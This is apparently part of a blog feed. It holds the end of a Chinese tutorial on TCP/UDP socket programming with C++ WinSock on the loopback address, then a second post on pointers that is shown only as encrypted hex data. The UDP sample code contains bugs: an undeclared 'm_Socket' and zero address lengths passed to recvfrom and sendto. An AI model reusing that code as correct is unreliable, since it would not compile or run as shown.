class="string">&quot;client quit!\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;client sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收服务端数据</span></span><br><span class="line">    <span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;server msg:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/002.png" class=""><blockquote><p>相似的步骤不做赘述，只看看关键的地方<br>除了基础类型char，也可以使用cpp的string类，那个自带个size倒是方便点<br>还有就是，服务端的特性，他不会主动连接，所以对于send，第一次肯定是客户端发起的，服务器启动后的事就是等待消息</p></blockquote><p><strong>比较抱歉的就是，c和cpp混用习惯了写代码老会混用，会努力改变这个不好的习惯</strong></p><p>上述的操作都是一对一，服务端没有办法同时连接多个客户端，最好的办法就是通过多线程，服务端能处理更多的连接。<br>多线程此处就不做演示了。</p><hr><h3 id="udp的demo"><a href="#udp的demo" class="headerlink" title="udp的demo"></a>udp的demo</h3><p>udp的服务器</p><ul><li>创建套接字</li><li>bind</li><li>recvfrom</li><li>sendto</li><li>关闭套接字</li></ul><p>udp的客户端</p><ul><li>创建套接字</li><li>sendto</li><li>recvfrom</li><li>关闭套接字</li></ul><blockquote><p>相比tcp，udp不需要监听然后去等连接请求，而是绑定完端口ip之后直接收发</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">SOCKADDR_IN m_addr;</span><br><span class="line">SOCKADDR_IN m_cliAddr;</span><br><span class="line"><span class="type">int</span> m_cliAddrLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line">WSADATA wsa;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wsastartup error!\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化套接字对象</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置地址端口</span></span><br><span class="line">m_addr.sin_family = AF_INET;</span><br><span class="line">m_addr.sin_port = <span class="built_in">htons</span>(<span class="number">9527</span>);</span><br><span class="line">m_addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">bind</span>(m_sock, (sockaddr*)&amp;m_addr, <span class="built_in">sizeof</span>(sockaddr_in));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = <span class="string">&quot;由服务端发送&quot;</span>;</span><br><span class="line"><span class="built_in">recvfrom</span>(m_sock, recvBuf, <span class="number">1024</span>, <span class="number">0</span>, (sockaddr*)&amp;m_cliAddr, &amp;m_cliAddrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;server recv：&quot;</span> &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">sendto</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>, (sockaddr*)&amp;m_cliAddr, m_cliAddrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;server send success!\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(m_Socket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">SOCKADDR_IN m_addr;</span><br><span class="line"><span class="type">int</span> m_addrLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line">WSADATA wsa;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wsastartup error!\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化套接字对象</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置远端地址端口</span></span><br><span class="line">m_addr.sin_family = AF_INET;</span><br><span class="line">m_addr.sin_port = <span class="built_in">htons</span>(<span class="number">9527</span>);</span><br><span class="line">m_addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = <span class="string">&quot;由客户端发送&quot;</span>;</span><br><span class="line"><span class="built_in">sendto</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>, (sockaddr*)&amp;m_addr, m_addrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;client send success!\r\n&quot;</span>;</span><br><span class="line"><span class="built_in">recvfrom</span>(m_sock, recvBuf, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;client recv：&quot;</span> &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">closesocket</span>(m_Socket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/003.png" class=""><p>这也是最基础的一次性连接过程，而且还是在本地的。</p><p>循环参考上面tcp那种就行。</p><p>多线程自行解决！！！！</p><blockquote><p>能优化的地方还有很多，像send和recv都是有返回值的，可以做校验。</p></blockquote><hr><h2 id="c-socket编程"><a href="#c-socket编程" class="headerlink" title="c++ socket编程"></a>c++ socket编程</h2><p>网上的文章有很多可以参考的。</p><p>先实现通信，在考虑传输文件或者数据。</p><p>可参考<a href="https://blog.csdn.net/npu_nazi/article/details/123653422">文章</a></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结不完~ 单独讲都能讲一堆，虽然也能简化。<br>不过对于这种网络模型，不管是osi理想的七层，还是tcp&#x2F;ip都有各自的缺点。</p><img src="/2022/10/25/tcp-ip/tcpSocket.png" class=""><img src="/2022/10/25/tcp-ip/udpSocket.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【指针篇】抽空复习</title>
      <link href="/2022/10/09/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/10/09/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7aae258c870494d818f27a58c0a49f2c6f54a51ccd4a2b15db47f1e69f113676">62ab62b0c6fb1d38deb12c5aa8fecd644a14b9a70b6cb42ade1b9fbe749db05c81bb283045ce7e098dec09408ed397e2bf112a131819c0d8351bc99967a6f0d7ca33c694d5e5e204b3a756cb007a20535586c890c187d66a6a1048d41dbf1a7aac500e76954f4c7aac7447b3b9709c0eeb8b78ec862eb0e881511b540239f9214327f2cb3a2c3a9b966c831ee72fcd287d26a3da5e396f57812800b3a655e0112e3e32270e068f897041b58cc46cf97dc08fa7dbb81c2774e9910888247ac772948cc210772ff4d7312e1aebd7a449081ea68f9067becf58234d50ed05df455c7e269b61d357857a2e037cffe8498372b00baa7c2cf638c3a1c9490d879638b982b408b5f19dae4d67c97cff96a783d914ebde7378d8e6b0688ddf15eb1d8246d55cf41f57e97ceb9fd8e91d972018636923729bd0bd328a7d2fb18759e5b05ef0a1a57fe0716b6eb8090509e667b68c4963efa1d6fb6783565c506b278c5731715f44c1d4194566e5f6d4d47734bf003bc770cb30d1573582f042a303c7c0e08df2baeca652d4a9b019ef242f50dbcf4007304d4fbc0909fc8158a34317e7314bf6fe35e017e2e7948d4b6e31cc71de550ed33bc8e1811c269b7dd63072858b271dce5380b3b60bffd3be1a60bb47d4bb422a998e75d96c50bca004237525678d840f3462b7f59898078b36bbfc686c11b0fc41ef857377945052f48e3a9c0e48e310b850bd73ca352ae4c232298847303260280b4b35e2832f829f43738248a8afb8d3cda7d01dc98c51e49ed3a115048a59fab51070ce5bf3b3b7f7108363aa6468748f17fb74368b8a45c4e8008126171fdb2eef1315f8278fb6fa954b37093579034d3a77c8bcc6bcb01523a103579b9879299f07099d26fb460eddcd0a9dc2a25039981457933d59f19a85b135700bac13c497f8439ede496f6715a03c1fdbc8b9ea859240730946df903471ebeb0392ad38d0c657b412801b46e2fddb26acc9bf87e893c409d587560521099629a3b449ab4486cf47de9e5e603998f82a2ca818c7ccfbe5aad080b0d1504c04ef1748bc56ed23f5f5248c5d499735e571f1709d32627ad2c92119b98ed75c112ed79713f20319b7d65efbce4cf6b6d13f7775b746663b8ba503651d451bd40e6f1e0cc65e5760a28db237031f0b3d317b24442c9c2b29cd33f8234c457b7c60054b525f55c96b5a32126a21fa40026df9455b05ec0a2658f9ee8660433dd928f902d3418461aef17d82b44c368337de3069d88dea8066c8274f0b29fc11d618d0ddf7434838c38394271e1a9b0c7b894f4a3c379e548f23e061545b03f056e023e288959cf4226d12a50d525f9b8ca8f4724dc1276fc3161a37a11266f9a0d13c05a4326c1937887fff807390ff4da4ccee4b43ad9b0987242cacc42a7467c7e4d41c04af1da28b77f2dd759ee7cd373a721d50f14baf58ab9f9a91450e5790b973f2026b8e424e0aaa403d9668915c28f6f58f5ffb39a6a07cf200c73e957285faedba3eacd23e520475e3bb9acfd4d059e2a9b1d0805c78c45dcde2968718311306970268c61eecdc20ffac3fe473ba39061f834e2f90e96601f625b6f49db097e5bd5c2d2aea6a9d7b76acc69312b1059ece795d59118430778ad4fa067d3330b51771bec41af33389e174a65d4d5b14826b94d61b8639da3e414d6fccc99ffabab3c53d08c3dc29100f47f2c153be2b7c8f566adc1b662d510da7af659ffd61826f892de42508e1d16d7cbce3d6bb477f60b9bb93e9e80d5a84c72cac6ed4714c6f9b4f648caf1041dd8f480c01b8e1b2d82a653f0026abd8ff4c035f6d30bd70eac07f91dfb1fea79e30edca67a9f7a17a95bed972afa227d79e224f95ed982617135a2d8021dad6c9c98b92e004136aab1df9201736125c06a97442be8f731981496e1da8cd18956686a3e84a7d6abee4dc462f5e897d9469f46e1222f9ebaa3da6f5fed8de653a24e3de1f3b76b4947c30eb99f3d279767d0d2a64e71049b595056d9f15e618e12000eea06be1198410dc77ba1ae63483b051781aab391d3bdf50fde88a32e82b805f4e1386abe37cb5b497c254bdcee394afcc8eb4335c9658ed0d305bdabd9a1c6c6f2ea3aa2ae9bfefd76953d8bc5f2bf476f587b8a12347e63476835cd9ad65bcb6697c3931963874ec76d5b1a774f688e86d420ddf008d8476d47b8e0dfd8b072c08328cf899f469cc8292792a707fa73d3e7ee255a40c16bf2827bbbfe8b430ae901b112b294d74334574d127e4ea041a0ea1fb95aceace8a7393a18be8ecc2d1cc7c9049d320f5537265ef5810cb64eb7a6c15987458d3d59db934790eaad32045982648b5d30b235c0a546fda1c8581cae82ecb07f3718f521ce5409eaa5d89e7dcd58e9f1fc1c92796581dc6ca262a7a71955b7ebf95d03f2935eb8293965051dc820b3378d598b98b800eb2c44644205e4447050dde3dbfd86347f9fed43c5a91fb74d1fcd1b8fe89e72af9863e4df27854b2db426d40fa83e156d60840181000065d5449956d7f1e26ed3d131fbed4385e2030d87e0cbaacc7f78ad5380a87d0e4a3b0a01659768f7c3f432277bff31a7241410688e88a709b7069a1e3a1a29b3c089c8ff8d0d7631efa8d041a9b73be24af1f1de30991c351bd13f2037dd75f04494e5e8e6e235b4c2f2519646f184b0086e4cb71890060d10c151e7ec53f0ef385498d8521d3d49188f1c4753cea5979b9d29f38bb9a4f2d0bc898ff568fd8b5379a0532936400efcb176ee9c36a14e8caafd47945bfcdfc3eee8d120c2188bcf0529776cdcec35e4515ed402ad4d930755a37f234143509f61b277d1a6f3dc862d844cd5ed5c1bca8617ce9431f256dc81ad23b666195cf2055858c658dc47fcc7bb2338fd60ef83d28e9f85e1e4d209eb51016730a5b8a95db23e75f7322cbcc3a813cba8abe40fc22c6373ecfdbc29d42feb16e48f55a62c8fde4d5f3e5c30679548edd9c64647972ca62f178e2088442133314158348cbf5e340b77e35d546a7ba301396a58155b216bd60dbf57ce01a563e812ef5f30a4e496fefd3b0d820d39303c00084105e22addf854aee54dc2bf4ca3b8be97c2d63ae80f9a024997991e1037d94fecea69d50f1ab4569cefd23725dbe99c1dd7ba8d6c4fb34899bf570c496125b488d324f705bd7a71341eeeec0cedbe91d466c145fe6caa027277dbd925a6a6f770d4c2ce94dbb6c52b87f226327aeee1aceb90f43672da21122220c5bf9bc02a42ee8e0c0b901b041d5af3549fff344b2bdee365a0f71b63acf9a2f404860e27bf8b9f069cfbc6f2ccc488e9e08faf9d0c2be47e5a6a237d2632751ed7b03775db6c558a339ff060b2fe3284b6fe10497776ad017357d3ea31f4643fdd04ab320a0d6d26c1f41454cc3149ab606a608cafb2687b0f1f0e678a675f0694e854cd08cbb020725b27905b99161180d4dfce1fb36fcce9712372d21870bb9da82088f53787a8e3edca0b3cdb1b6d7c92eab73e5a032ca2618cdc3af25b00eceeb20ab1ff30aba70b6edcf5a91769a444c9662566f41e9cb7016923abea1d78470c8bc27f9370d85a6f7373efa5edf568c00e3a51acfa905bb249b59fc12dcc1a6be7fe88bb34e595f73b1a1c6660cca25e7d835d7a3e5bedc790fe88b95e70d66094d9c71da39e2834e4382d9fa4f3ff6ea71e5bd0ed4bcdd9a6288acaf62ccf01112af2b2adb7f664265251bbf93b1b89465cb14dfc11fb531d8a18258e444553aea0b6be02670c8615009d4435c8e9957b5dcb2e30b2c07d1a952d5237750114e86b55b48eea3afaad2cc65ab2065f57ed498f93dd9025eb4b33fb6232ff172ac535e77dae69b51d8f956f8f9a0225b8c19d1a2805b422ef61682b3606b2087a9d0669df7125d06574cd0c189221f109f5cc3e4a534375d3c5e24c4f881119f04fd6c4291b00eff9062251d8ef52616162ee11a5350eec76fbba9f94b75ebf615a1d1fc23f7a0c75913493c6c25bd25b94a5f43485e93422f8ccca5dff9ea75a753bbc631ccb98aac60fa805d8f8de6ab04f210996eb2dfe8939dc4593a6ce7b5172bbf73975c9ba93f81155b17839daa40c523f173eeab836df0f0b2845cfce64617939e0c7ef0c3ee3a37df8f7e4d1d540a9ad304042db1dacb4bbf12c0a89b4d85ec278adaab08a5e4b568b7d87d98316926793226eda7ac5d5baf15e4453343c2bf6ae50f638a55308e1ef5580e234fd3edbff6ab66c4972d3b3a872502a04bd14d1e25a31afcebf8e67c1b5c0d2c590a2586f9c604ad2cf3670e7437c23b3474c70e52316ac480f3e37389ba93a480e25b62a891336ae00aabff4a8c2994224e432b7d0b6f440b1ff4431f2ae9af5f2f57f565fe0e29352830e30f748058f36871b25ddde3735776f0d8e06db9e18a738682cd131c46b010aadf9decdfba2deec7b8ec077f9b43b83099099a543c20b8ee0ebdfbea94a0f5a00c100e9b1f3de3853c7a0600a61dcfb0cceaa90c10d5c958dcda7b4dbe3c111c0a0d006f28f8a5504d065d18470d7fd5ff1dbba8f06700eb90588e4c3ba79f7c8b2becf698cfdc4f7f72357ef450b6b3864544e3fe674f0ca03fa56ba549aba193deef25f27f98c676aa2f8c4d657876918ade7675b4779df12b64612196e581124eb2db9cfd644c53390a7a5fe105a8405f1381a1a28d494015a920c6401145e5b13d6e3ca2f5ec59be0201a071e3153fbd6477b32ea86bacefac32b6f918d8627b4b0ec45ab8cdf09cf979b77e9c7b60a25b0f4beb85359ba7fd44ceb20aeec19f1c2586cb1defd4a0a86fa613710a682ca6d5d053e96139d8707dfc37fedb27a98f9bb8096d97cab1f18d42f96c55466b7d8b86b94feeb0fd16f3a8710df546f0c2ca49a7e8e14d94e7d9bce6c26fd480c1f10876c4e6e31312f35034000daf2fbe82e05864c33194e6d00fa77839915e11c4317b570317ba5a0a0f97faf2519ccf04cc0bd393a12b4ca63166c046596c982a37ebcef8a246a2d5116b6668600726bc8140a2dad1391ad6db3031fbc16b2e4825852f0d96cd265f947b24f3eca3578cf7a5128b4e5c5c844943358110d7d1f2a306f502824e01d8104ebeca999d7d07f809d14ea9adfb3c7b48300ff14656ec80710a6872198a790d2c03f9480655f2922ea5ab6c13f7cf3dc7447eba5907046475972c8d352a9ac2d01827f0342584afda11f70220bc09320e849a1df2ffcfc0da4d0aa55ad20fe262d7be234df706b24f23e7aa5fa73a83b7432daabbeaa5f8e69a6f9f81c070fc7d0e1167148bc0df62678d9b5e452c6a9cb2c844663efb90e4bf7367e486ada043352cbe4ae1db9a48ccfa47cbe787a58c306871d319d139aed3789cad2adb5462145157427650d46f03e54d8c58f195734a49c0c9cf5d3bf8b415f1b06e53148e62944542b835339eab40922cc448a88710a75e51c94fe7555a9a0e457c22c496cc4e64192a55cbdcf1117668cb28fd09d1658431bfe2ccdd21cc6c6179560cbcc3665b5c525b077544beb71d90407906627e4444ebacdd5801c87b000565aef8ccc969f81cf48bc22333334d9b85e061a8c059ec451a09de8c02f6354f2aa1f7f424c2331675c67c78f5cf820dc93009a7e375d09059dfdc2e357eaa70135590fc051c4bc90e5c38d1ec8af0799995117499e79afe525c04493b694dbe441d34baaa3c8643fe7592bf5493e0d31662b7905e121c2e0170741384a4b87f49dc4b1dce2fbc9699f2aca41b8f940d715c62a6f4021c7467356dae68c49b55994673842098418996fb23a9592490b6c7069a796376a3093325d80b65033f6af4790ae842ea8cbba7f0a4f0b33d524fbb16070c4bc59a4257f8cabcb7c22ab8fb92fd952ca6669f24a3a784e2fa2727b943b0374e0298cf76f3a99155a5de314d39e3902b7f5b9c1e365e6604c89509d0fbb7e797b559920f1d5d72963ec99812aeb478de330b7a4f10b59e22e63e5aeae03e23f56c70d10d9d55dd8538f3b5d1a9669cc6aafe44da1cea15701b3600ed6562685e8a85d42be30af3a9a110d4506d2b5b03d2df5ac264c91fb71f33af4dd6444e94857cc431454d60ba9c8c1689a65c0dff2f036b053f98332376ff47808fe2d5b5f9b8ba69b67b36214ce9cfba2bc471babb9f8effc91d522853bb32f2285c124f48faf7d20d7f4ea7131a310ff4045fb28b2f158bb0c3885535b948a181faebabd0607dc6ae6dc85c61129f9026ec90c111b33be97cffd533220908e7ec87e771d8834bc15820f5ef1f3a7331bf7498748869cf3abc639b44b0017a0d153118b9c9dd8d5a35601c9e6d643a946868db2ed954268cc776d613386b39c10dbefb30fc36a0220a61157d2353edbf9130155cbc377bda64658ac8ab87f942bba47d6e806863f089150781eb0fe09ecc81e9e5f567be3054ece4b0a1781bf9215e8389a4443c19ecebade0783d2ca9b789a9fb96341fe5b3fee3a1ab18ef08c9508290fd52ac0c54856ea515e35d86f8dc221f2517ea902b50469dcc341a45d096d24d4759fed8e02113006c483d51e9fa19a419b8839813174601f2ab0f7b596cfc11317af9d1dc324265e20a690f0022fdfc5fc545ef5885ca35b5b932209214b06be762bd1d676a407b12bbec2236892fe19c9aac535fea42d3492db22fb7106a5c3b6f02cf66fa4996c7a2a5b6120f5023c0c31b8205a41a585376336d4618d305e4b34dff5809c1b974da5130ba6fb6c963117153b17f283251f1b22e2e2ab0ac690db0506512a671720c3b787592676ed26b650de8ddd96a19d941772195d3b372f6f7cc3777852b9132861f33224316c372ae72fef3e757c30c60fe52804ad01f90e5c1a986dc52aa8695d4add66f72efb51a0639b5e481b84f1c8b2c98e4c986692775145adc88c8aa9de505a84d48b3d4086ac4893c476f62f161be21d15014bdb3f757b6875997ce8bd5bcd3887ff624632f21f208770edf80f6ddffd4b13b8932939309a884b99ff2c627f00b2cbe8cd02076fb3e8b75f4c43cff0755f6ab205f84f9f5cb2b04a86310e1d41bfbfc48fd8e7c6ed629ddc3d9120f7b5ebcb20055b0db7cb73a685b6492b51b507dce5e0a88473f64a6813c15ddd825aaa68d980bcb547249a3e9ea8f037aab4032c757e612090d56291551a7609b58f8b6f5ad6bbed889117a3ef46a53a5f17d328d9a9fa371c3bdc82127a82b702318445e9fdaddf46783bc5bb27b6ae9a79c836613ca8836a1aea7a22ae8b8a7498681ce9d151e84e4c6ac02742b23c8bdc1be7109a711a36c872fc540ee401f22caca3404b4ff176b2b1359e92e8d8ed6a13ad37d108b14729bbaa9c6f69b02c6cbf710ea8b616056724c2a90f7b710bf7dc1c7786001b37f31cda51474bf8c849617f88e1f54b66801cb210f7c4774e11fd2c733109b3f4d702d70b6941acc613c371d67a8d9ecd927ec47c1cbfb5359ccd04a3c66b5e8b43e96b06bfe784e4c9c3dd2c2d14beb29f64605dd733f5f74e28631933e11bbf1ec3b45c05ee4f43b8846d6e9834784f9f9575a27563799b1f86aea6362530b9ce7e9b4cc51e5a779520d5e160549dc99458919084392a0455f62f4add7fc2135977f861d5d3301657110f2d663b2a5c7d8be8845c74ecac80dcd844725cf989cc056f31ab3b8eddc57f05ab8dfbd40f021e3292bef287af038aba7a17a8cf76d4dfc4cc004017133b92e4b82925d8d2e64c38fe82fa134aa9a6723cec9d4d865e7f5389d4335fba13ab2f8d0c5c59e65474db86986d7c94aa19d1817ebfb0d9d4ed87ce6002fd4a77d799d76753da2e81b83c03d46d28a9ec3ea736586fa2d01b9264de71a2abddc94e47124eb38ced99c1890fa514abc5c8810f56217ef992a9863fc31a541626cf3313f6711ffb1cbbb602c0d0a7c669cea86670df62f8ac89a1d8c7c37f9d31568a7b97c92b8fa9dfa57107b7f19bee5b4adf83d33c81b5b0a8a027bc5acebd53eddd895d13e32f3fa1c28aec004956e151a5c56fa3fe33776b6f359f04f226c4dbe04205e215b8699d2135f5a8d30b51a96df18c2ce2b2e193e05df5921f45bf99c1fbcdc4dbd0811c17890d06597f4a5620343b33fafcdade89031c1cc62d4947c958b601f3e868e6d13ed535ddd816bfa25d22a82992663c0777c3994842478b054eae4765f54378d5d1e20b8a38bd9eebb6bc8cf72055a555e36044580425e3897a6f9adcf3bd80469403c222b957783ae0de80d052ab15418078d265d6589b6c2096039f1117ef1d918919b14dab6c4e04c7f0b51b2ef65b551a32ff720d9c65842321bfa4f5323dd53f51826b777cb71f324c0ea0fc4da5b2ad0ae698d0ab43a7da19341995ae64f147048c81cf837ae7c8a19619697ab8d9fbadcd961224a348c675e95c52a7055dae012e3eb5681fc74f866cd326c16df67ca25938663b27888f873011578344013da8f8cc2fda4b415c2808f6b22818f6829650bdb3e5348390d314bf3a72c21750b5e1519497f4f4f1157b3cbf8bae52aca2adb7caf8ad6f2eb1de5f9edfed6bae08ae9d47bf0ee6c5a065fed4bc386d777afbc2d3cdd516f9590cef574e813314fb05213b6f89793a0017e7ec63137a6dadca2d8e612f32a7c0cc4a3022f7d71c7c3b38205edde95691cee00cbe4e191390b10a60b65a31459bf8c84e9b7e516c5d39558cdfd7307df1ea7e8289b8ea7cb9aef0658c09bc6d59915ec5dd96be27d5363c986fe3e292050918c33abfdfe8b7a7546215ff0bc4fcfc88939785d6f519cff938e61aad2edfd9c97bf9ef68635d307023e4dfce7ae4ba19eb87cc308a799e8d93b5951d2dc9a1d423f5b7235dd0a9b89fa7b1efc0e0e706aff7b7369890f8f82de15d0f98ce3a1bb4f76eaf5e25d688bdb54dddba5ee02e86a79bd76cb74f35baed47524684efc44689ec25888614cbc6e34d7ddcff683716517763d40f865815f2d014a51876cc93d06039dae95af069d3274f31fb3a189571d276360cf1609d33a49e98b880e7daeb5654c99c86680d6d1e5412bc226df27f7f67f903ae5f6a2bf5b4d7492496a3a50922a272ffef008efdf9d299b91b1e1f2e7fec0f74a3d2b3968c278f6ece7d7d46897b92d81f6b99eb83d4669e5643c9db34e1fce23fa18d294351122d521c3c6f2e8aef6797ee0b5a68f6af338cede7f4d5e3439c1245776e299443741181950e8f04379c9d058d56faae63e7d1a52e33c5ab9e66b99c331c2a9ac65d142e1f80510d1165cd687c44cf8f66d596b4dd3247cd7238c30bd058cab70bea3c706f5cfca0f5f1e211cee16778fa7a44d317f9ff860ff04c1ca09b6e701b5c8a7dfbec95b54529dee5cbefcc488f9767a5028bce35a95288f8c893e667e870680e08f7e4bbdf86366ad63ed1